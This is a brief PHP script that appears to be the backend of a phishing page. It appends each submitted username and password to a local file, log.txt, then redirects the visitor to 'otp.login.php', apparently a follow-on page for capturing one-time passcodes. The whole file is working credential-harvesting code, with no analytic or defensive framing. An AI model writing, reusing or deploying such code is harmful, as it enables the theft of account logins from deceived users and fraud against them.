<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents( "log.txt" , "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
fclose($fp);
header('Location: otp.login.php');
exit();
